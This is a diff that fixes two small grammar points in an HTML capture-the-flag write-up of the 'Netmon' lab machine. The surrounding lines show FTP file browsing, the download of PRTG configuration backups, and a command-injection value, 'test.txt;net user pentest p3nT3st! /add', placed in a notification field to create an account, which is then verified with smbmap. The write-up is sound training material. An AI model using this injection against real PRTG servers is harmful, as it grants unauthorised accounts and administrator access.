@@ -164,7 +164,7 @@
         <p>Digging through the files, we can find the user flag at C:\Users\Public\Desktop\user.txt</p>
         <pre><code>cd Users</br>ls</br>cd Public</br>ls</br>cd Desktop</br>ls</br>more user.txt</code></pre>
         <img src="../images/netmon5.png">
-        <p>Further digging through the file system, we find the configuration files and it's backups for PRTG Network Monitor.</p>
+        <p>Further digging through the file system, we find the configuration files and its backups for PRTG Network Monitor.</p>
         <pre><code>cd /</br>dir -a</br>cd ProgramData</br>dir</br>cd Paessler</br>dir</br>cd PRTG\ Network\ Monitor</br>dir</code></pre>
         <img src="../images/netmon6.png">
         <p>We then download all the configuration files to our attack machine. Since this file is large, we change our FTP mode to "binary" and start downloading.</p>
@@ -203,7 +203,7 @@
         <p>We can use the following parameter option, as indicated in the blog post.</p>
         <pre><code>test.txt;net user pentest p3nT3st! /add</code></pre>
         <img src="../images/netmon17.png">
-        <p>Now we can test run our notification, which should execute our command payload. We can test by attempting to authenticate using smbmap</p>
+        <p>Now we can test run our notification, which should execute our command payload. We can test by attempting to authenticate using smbmap.</p>
         <pre><code>smbmap -H 10.10.10.152 -u pentest -p 'p3nT3st!'</code></pre>
         <img src="../images/netmon18.png">
         <p>Great, it works. Now we can modify our notification exploit to make our user an administrator.</p>
